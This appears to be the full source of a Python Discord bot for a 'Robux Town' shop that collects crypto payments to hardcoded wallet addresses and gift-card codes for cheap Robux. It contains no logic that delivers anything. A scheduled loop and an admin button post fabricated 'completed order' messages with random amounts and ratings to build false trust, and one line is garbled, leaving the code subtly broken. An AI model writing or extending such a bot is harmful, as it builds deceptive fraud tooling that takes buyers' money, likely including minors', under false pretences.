#!/usr/bin/env python3
# Robux Town™ – FINALIZED UI + LIVE PRICES + ADMIN PANEL + PRICE LIST + AUTO FAKE COMPLETION
import os
import asyncio
import json
import re
import random
import time
from datetime import datetime, timedelta
import requests
import discord
from discord.ext import commands, tasks

# --- Rewarble Links ---
ENEBA_REWARBLE_LINK = "https://www.eneba.com/rewarble-rewarble-visa-10-usd-voucher-global"
G2A_REWARBLE_LINK = "https://www.g2a.com/rewarble-visa-gift-card-10-usd-by-rewarble-key-global-i10000502992001?suid=960beb55-4797-46d5-b14c-94995fd68f31"

# -------------------------------------------------
# TOKEN FROM NORTHFLANK (BOT_TOKEN)
# -------------------------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN not found in environment variables! Set it in Northflank.")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="+", intents=intents, help_command=None)

# -------------------------------------------------
# CHANNELS & IDs
# -------------------------------------------------
INFO_CHANNEL_ID = 1435516058105675818
PRICE_CHANNEL_ID = 1435516058105675817
COMPLETED_CHANNEL_ID = 1435516058286035015
LOG_CHANNEL_ID = 1435516058286035020
STAFF_ROLE_ID = 1435516057526734991
STAFF_DM_IDS = [1422665161466187976, 1269145029943758899]
PAYMENT_METHOD_CHANNEL_ID = 1435516058105675820
TOS_CHANNEL_ID = 1435516058286035016

# -------------------------------------------------
# EMOJIS
# -------------------------------------------------
EMOJI_ROBUX = "<:Robux:1435526693472178176>"
EMOJI_VERIFIED = "<:Verified:1435526918891110551>"
EMOJI_LOADING = "<a:Loading:1435526855523434576>"
EMOJI_WARNING = "<:warning:1435526954689495091>"
EMOJI_BITCOIN = "<:Bitcoin:1435526466527039579>"
EMOJI_LITECOIN = "<:Litecoin:1435526448684339321>"
EMOJI_ETHEREUM = "<:Ethereum:1435526489876543250>"
EMOJI_SOLANA = "<:Solana:1435526512345678901>"
EMOJI_CARD = "<:Card:1435526554783318047>"
EMOJI_PAYPAL = "<:PayPal:1435526543513354354>"
EMOJI_PAYMENT_SUPPORT = "<:PaymentSupport:1435526934567890123>"
EMOJI_COG = "Settings"
EMOJI_CRYPTO = "<:Crypto:1437309415551406222>"
EMOJI_USER = "User"
EMOJI_USD = "USD"
EMOJI_RATING = "Rating"
EMOJI_ORDER_ID = "Order"
EMOJI_LOCK = "Lock"
EMOJI_MAX = "Stop"

# -------------------------------------------------
# PRICING
# -------------------------------------------------
ROBUX_RATE_PER_1000 = 1.00
def get_price(robux_amount: int) -> float:
    return (robux_amount / 1000) * ROBUX_RATE_PER_1000

ROBUX_PRODUCTS = {
    10000: {"label": "10,000 Robux", "price": 9.99, "tag": "Most Popular", "style": "fire"},
    25000: {"label": "25,000 Robux", "price": 24.99, "tag": "", "style": "default"},
    50000: {"label": "50,000 Robux", "price": 49.99, "tag": "", "style": "default"},
    100000: {"label": "100,000 Robux", "price": 99.99, "tag": "", "style": "default"},
    250000: {"label": "250,000 Robux", "price": 249.99, "tag": "Best Deal", "style": "deal"},
}

# -------------------------------------------------
# CONFIG & CRYPTO
# -------------------------------------------------
CONFIG_FILE = "config.json"
CRYPTO_IDS = {"btc": "bitcoin", "ltc": "litecoin", "eth": "ethereum", "sol": "solana"}

default_config = {
    "wallets": {
        "btc": "bc1qv5peyagvfup2k2j62xeawhzylar5ea7cn8usw6",
        "ltc": "ltc1qqn5rv2fzkssc6shxqu3u2adzk9ult0jat9785j",
        "eth": "0x11bd2A8Ce35BFE5DF02D67A9b6971f1910C68085",
        "sol": "HvXxk4xPYScvQdEQPyDSF4PP2SdTiJzHtxR4qKLdtJ2K"
    },
    "qr_urls": {
        "btc": "https://i.ibb.co/TMCF8r85/Screenshot-2025-11-10-at-6-28-08-PM.png",
        "ltc": "https://i.ibb.co/zhbtHyRp/Screenshot-2025-11-10-at-6-28-58-PM.png",
        "eth": "https://i.ibb.co/67YFkD4h/Screenshot-2025-11-10-at-6-29-33-PM.png",
        "sol": "https://i.ibb.co/XfDB2z1b/Screenshot-2025-11-10-at-6-30-02-PM.png"
    }
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                loaded = json.load(f)
            config = default_config.copy()
            config.update(loaded)
            return config
        except:
            return default_config.copy()
    return default_config.copy()

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=2)

config = load_config()

async def get_crypto_price(crypto: str) -> float:
    try:
        r = requests.get(f"https://api.coingecko.com/api/v3/simple/price?ids={CRYPTO_IDS[crypto]}&vs_currencies=usd", timeout=5)
        r.raise_for_status()
        return r.json()[CRYPTO_IDS[crypto]]["usd"]
    except:
        return 60000.0 if crypto == "btc" else 80.0 if crypto == "ltc" else 3000.0 if crypto == "eth" else 100.0

# -------------------------------------------------
# SEND TO STAFF
# -------------------------------------------------
async def send_to_staff(order_data: dict):
    embed = discord.Embed(title="New Payment Submission", color=0x00A3FF)
    for k, v in order_data.items():
        embed.add_field(name=k, value=v, inline=False)
    for user_id in STAFF_DM_IDS:
        try:
            user = await bot.fetch_user(user_id)
            await user.send(embed=embed)
        except: pass
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        await channel.send(embed=embed)

# -------------------------------------------------
# MODALS
# -------------------------------------------------
class PaymentModal(discord.ui.Modal):
    def __init__(self, method, amount, price, crypto=None):
        super().__init__(title=f"Submit {method.upper()} Details", timeout=None)
        self.method = method; self.amount = amount; self.price = price; self.crypto = crypto
        self.details = discord.ui.TextInput(label="TX Hash / Code", style=discord.TextStyle.paragraph)
        self.add_item(self.details)

    async def on_submit(self, interaction: discord.Interaction):
        method_name = self.crypto.upper() if self.crypto else self.method.capitalize()
        data = {
            "User": f"{interaction.user.mention}",
            "Robux": f"{self.amount:,} {EMOJI_ROBUX}",
            "USD": f"${self.price:.2f}",
            "Method": method_name,
            "Details": self.details.value,
            "Thread": interaction.channel.mention,
            "Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        await interaction.response.send_message(f"{EMOJI_VERIFIED} Submitted!", ephemeral=True)
        await send_to_staff(data)

class AddressModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set Crypto Address", timeout=600)
        self.coin = discord.ui.TextInput(label="Coin (btc/ltc/eth/sol)", max_length=3)
        self.address = discord.ui.TextInput(label="Address", style=discord.TextStyle.paragraph)
        self.add_item(self.coin); self.add_item(self.address)

    async def on_submit(self, interaction: discord.Interaction):
        coin = self.coin.value.lower()
        addr = self.address.value
        if coin in config["wallets"]:
            config["wallets"][coin] = addr
            save_config(config)
            await interaction.response.send_message(f"{EMOJI_VERIFIED} **{coin.upper()}** address updated.", ephemeral=True)
        else:
            await interaction.response.send_message(f"{EMOJI_WARNING} Invalid coin.", ephemeral=True)

class QRModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set QR URL", timeout=600)
        self.coin = discord.ui.TextInput(label="Coin (btc/ltc/eth/sol)", max_length=3)
        self.url = discord.ui.TextInput(label="QR URL", style=discord.TextStyle.paragraph)
        self.add_item(self.coin); self.add_item(self.url)

    async def on_submit(self, interaction: discord.Interaction):
        coin = self.coin.value.lower()
        url = self.url.value
        if coin in config["qr_urls"]:
            config["qr_urls"][coin] = url
            save_config(config)
            await interaction.response.send_message(f"{EMOJI_VERIFIED} **{coin.upper()}** QR updated.", ephemeral=True)
        else:
            await interaction.response.send_message(f"{EMOJI_WARNING} Invalid coin.", ephemeral=True)

# -------------------------------------------------
# CLOSE TICKET
# -------------------------------------------------
class CloseTicketView(discord.ui.View):
    def __init__(self, thread_id):
        super().__init__(timeout=None)
        self.thread_id = thread_id

    @discord.ui.button(label="Close Ticket", style=discord.ButtonStyle.red, emoji=EMOJI_LOCK)
    async def close(self, i, b):
        thread = bot.get_channel(self.thread_id)
        if thread:
            await i.response.send_message("Closing...", ephemeral=False)
            await thread.edit(archived=True, locked=True)
            active_flows.pop(i.user.id, None)

async def send_disclaimer_embed(thread: discord.Thread):
    embed = discord.Embed(title="Warning", color=0xFFA500)
    embed.description = "Keep all deal talk in this ticket. Staff will **never DM you**."
    await thread.send(embed=embed, view=CloseTicketView(thread.id))

# -------------------------------------------------
# PURCHASE FLOW
# -------------------------------------------------
active_flows = {}

class PurchaseFlow:
    def __init__(self, user_id, thread):
        self.user_id = user_id
        self.thread = thread
        self.robux = 0
        self.price = 0.0
        self.method = ""
        self.crypto = ""

    async def send_step(self, step: int):
        if step == 1:
            await send_disclaimer_embed(self.thread)
            embed = discord.Embed(title="Start Buying? (1/5)", color=0x00A3FF)
            view = discord.ui.View(timeout=None)
            view.add_item(discord.ui.Button(label="Yes", style=discord.ButtonStyle.green, custom_id="flow_yes_1"))
            view.add_item(discord.ui.Button(label="No", style=discord.ButtonStyle.red, custom_id="flow_no_1"))
            await self.thread.send(embed=embed, view=view)

        elif step == 2:
            embed = discord.Embed(title="How much Robux? (2/5)", color=0x00A3FF)
            embed.description = "Enter amount (min 10K, max 800K):"
            await self.thread.send(embed=embed)

        elif step == 3:
            self.price = get_price(self.robux)
            rate = get_price(1000)
            embed = discord.Embed(title="Confirm (3/5)", color=0x00A3FF)
            embed.description = f"**{self.robux:,} {EMOJI_ROBUX}** → **${self.price:.2f}** (${rate:.2f}/1K)"
            view = discord.ui.View(timeout=None)
            view.add_item(discord.ui.Button(label="Yes", style=discord.ButtonStyle.green, custom_id="flow_yes_3"))
            view.add_item(discord.ui.Button(label="No", style=discord.ButtonStyle.red, custom_id="flow_no_3"))
            await self.thread.send(embed=embed, view=view)

        elif step == 4:
            embed = discord.Embed(title="Payment Method (4/5)", color=0x00A3FF)
            select = discord.ui.Select(placeholder="Choose", custom_id="payment_select")
            select.options = [
                discord.SelectOption(label="Crypto", value="crypto", emoji=EMOJI_CRYPTO),
                discord.SelectOption(label="Card (G2A)", value="card", emoji=EMOJI_CARD),
                discord.SelectOption(label="PayPal (Eneba)", value="paypal", emoji=EMOJI_PAYPAL),
                discord.SelectOption(label="Giftcards", value="gift", emoji=EMOJI_PAYMENT_SUPPORT),
            ]
            async def cb(i): await self.payment_callback(i)
            select.callback = cb
            view = discord.ui.View(timeout=None)
            view.add_item(select)
            await self.thread.send(embed=embed, view=view)

    async def payment_callback(self, interaction: discord.Interaction):
        self.method = interaction.data["values"][0]
        await interaction.response.defer()
        if self.method == "crypto":
            embed = discord.Embed(title="Select Coin", color=0x00A3FF)
            select = discord.ui.Select(placeholder="Coin", custom_id="crypto_select")
            select.options = [
                discord.SelectOption(label="BTC", value="btc", emoji=EMOJI_BITCOIN),
                discord.SelectOption(label="LTC", value="ltc", emoji=EMOJI_LITECOIN),
                discord.SelectOption(label="ETH", value="eth", emoji=EMOJI_ETHEREUM),
                discord.SelectOption(label="SOL", value="sol", emoji=EMOJI_SOLANA),
            ]
            async def cb(i): await self.crypto_callback(i)
            select.callback = cb
            view = discord.ui.View(timeout=None)
            view.add_item(select)
            await interaction.followup.send(embed=embed, view=view)
        else:
            await self.send_payment_invoice(interaction)

    async def crypto_callback(self, interaction: discord.Interaction):
        self.crypto = interaction.data["values"][0]
        await interaction.response.defer()
        await self.send_crypto_invoice(interaction)

    async def send_crypto_invoice(self, interaction: discord.Interaction):
        price_usd = self.price
        coin_price = await get_crypto_price(self.crypto)
        amount = round(price_usd / coin_price, 8)
        address = config["wallets"].get(self.crypto, "Not Set")
        qr = config["qr_urls"].get(self.crypto, f"https://api.qrserver.com/v1/create-qr-code/?data={address}&size=200x200")
        expiry = int((datetime.now() + timedelta(minutes=20)).timestamp())
        embed = discord.Embed(title=f"{self.crypto.upper()} Invoice (5/5)", color=0x00A3FF)
        embed.description = f"Send `{amount:.8f}` {self.crypto.upper()}\nExpires: <t:{expiry}:R>"
        embed.add_field(name="Address", value=f"```{address}```", inline=False)
        embed.add_field(name="Amount", value=f"`{amount:.8f}`", inline=False)
        embed.set_image(url=qr)
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="Submit TX", style=discord.ButtonStyle.blurple, custom_id="submit_tx"))
        await interaction.followup.send(embed=embed, view=view)

    async def send_payment_invoice(self, interaction: discord.Interaction):
        name = "Giftcard" if self.method == "gift" else self.method.capitalize()
        details = ""
        if self.method == "card":
            details = f"Buy Rewarble Card from G2A: [Link]({G2A_REWARBLE_LINK})"
        elif self.method == "paypal":
            details = f"Buy Rewarble Card from Eneba: [Link]({ENEBA_REWARBLE_LINK})"
        embed = discord.Embed(title=f"{name} Invoice (5/5)", color=0x00A3FF)
        embed.description = f"Submit code below.\n\n{details}"
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="Submit", style=discord.ButtonStyle.blurple, custom_id="submit_details"))
        await interaction.followup.send(embed=embed, view=view)

# -------------------------------------------------
# INTERACTIONS
# -------------------------------------------------
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or "custom_id" not in interaction.data:
        return
    cid = interaction.data["custom_id"]
    flow = active_flows.get(interaction.user.id)

    if cid == "flow_yes_1" and flow:
        await interaction.response.defer()
        await flow.send_step(2)
    elif cid in ["flow_no_1", "flow_no_3"] and flow:
        await interaction.response.defer()
        await flow.thread.edit(archived=True, locked=True)
        active_flows.pop(interaction.user.id, None)
    elif cid == "flow_yes_3" and flow:
        await interaction.response.defer()
        await flow.send_step(4)
    elif cid == "submit_tx" and flow:
        modal = PaymentModal("Crypto", flow.robux, flow.price, flow.crypto)
        await interaction.response.send_modal(modal)
    elif cid == "submit_details" and flow:
        modal = PaymentModal(flow.method, flow.robux, flow.price)
        await interaction.response.send_modal(modal)

# -------------------------------------------------
# MESSAGE HANDLER
# -------------------------------------------------
@bot.event
async def on_message(message: discord.Message):
    if message.author.bot or not message.channel.name.startswith("Purchase-"):
        return await bot.process_commands(message)

    flow = active_flows.get(message.author.id)
    if not flow or flow.thread.id != message.channel.id:
        return await bot.process_commands(message)

    if flow.robux == 0 and re.fullmatch(r"[\d,]+", message.content.strip()):
        try:
            amount = int(message.content.replace(",", ""))
            if amount < 10000:
                await message.reply(f"{EMOJI_WARNING} Min 10K.", delete_after=5); return
            if amount > 800000:
                await message.reply(f"{EMOJI_MAX} Max 800K.", delete_after=5); return
            flow.robux = amount
            await message.delete()
            await flow.send_step(3)
        except: pass
    await bot.process_commands(message)

# -------------------------------------------------
# FAKE ORDERS
# -------------------------------------------------
async def send_completed_order(amount, price, method):
    channel = bot.get_channel(COMPLETED_CHANNEL_ID)
    if not channel: return
    order_id = str(int(time.time() * 1000))[4:] + str(random.randint(100, 999))
    embed = discord.Embed(title="New Completed Order", color=0x38B750)
    embed.set_thumbnail(url="https://i.ibb.co/whbgBHWz/9c5fd434-f30f-4e24-8212-ea40fa098678.png")
    embed.add_field(name="User", value="**Hidden**", inline=True)
    embed.add_field(name="Method", value=f"**{method}**", inline=True)
    embed.add_field(name="Robux", value=f"**{amount:,} Robux**", inline=False)
    embed.add_field(name="USD", value=f"**${price:.2f}**", inline=True)
    embed.add_field(name="Rating", value="Rating (4/5)", inline=True)
    embed.add_field(name="Order ID", value=f"`{order_id}`", inline=False)
    embed.set_footer(text=f"Robux Town • {datetime.now().strftime('%B %d, %Y at %H:%M UTC')}")
    await channel.send(embed=embed)

@tasks.loop(hours=random.uniform(5, 10))
async def automated_fake_completion_loop():
    amount = random.choice([10000, 25000, 50000, 100000, 250000])
    price = get_price(amount)
    method = random.choice(["Crypto", "Card", "PayPal", "Giftcard"])
    await send_completed_order(amount, price, method)

# -------------------------------------------------
# ADMIN PANEL
# -------------------------------------------------
class AdminPanel(discord.ui.View):
    @discord.ui.button(label="Set Address", style=discord.ButtonStyle.blurple, emoji=EMOJI_CRYPTO)
    async def addr(self, i, b): await i.response.send_modal(AddressModal())
    @discord.ui.button(label="Set QR", style=discord.ButtonStyle.blurple, emoji="Image")
    async def qr(self, i, b): await i candidatura.response.send_modal(QRModal())
    @discord.ui.button(label="Fake Order", style=discord.ButtonStyle.green, emoji="Robot")
    async def fake(self, i, b):
        await i.response.defer(ephemeral=True)
        await send_completed_order(50000, 50.0, "Crypto")
        await i.followup.send(f"{EMOJI_VERIFIED} Fake order sent.", ephemeral=True)

@bot.command()
@commands.has_role(STAFF_ROLE_ID)
async def admin(ctx):
    await ctx.send(embed=discord.Embed(title="Admin Panel", color=0x00A3FF), view=AdminPanel())

# -------------------------------------------------
# PERSISTENT BUTTON
# -------------------------------------------------
class BuyView(discord.ui.View):
    @discord.ui.button(label="Purchase Robux", style=discord.ButtonStyle.blurple, emoji=EMOJI_ROBUX)
    async def buy(self, interaction: discord.Interaction, button):
        if interaction.user.id in active_flows:
            await interaction.response.send_message(f"{EMOJI_WARNING} You already have a thread!", ephemeral=True)
            return
        info = bot.get_channel(INFO_CHANNEL_ID)
        thread = await info.create_thread(name=f"Purchase-{interaction.user.name}-{random.randint(1000,9999)}", type=discord.ChannelType.private_thread)
        await thread.add_user(interaction.user)
        flow = PurchaseFlow(interaction.user.id, thread)
        active_flows[interaction.user.id] = flow
        await interaction.response.send_message(f"Started in {thread.mention}", ephemeral=True)
        await flow.send_step(1)

@bot.command()
async def setup(ctx):
    channel = bot.get_channel(INFO_CHANNEL_ID)
    embed = discord.Embed(title="Robux Town™", description="Click to buy!", color=0x00A3FF)
    await channel.send(embed=embed, view=BuyView())

# -------------------------------------------------
# STARTUP
# -------------------------------------------------
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    bot.add_view(BuyView())
    if not automated_fake_completion_loop.is_running():
        automated_fake_completion_loop.start()

# -------------------------------------------------
# RUN
# -------------------------------------------------
bot.run(BOT_TOKEN)
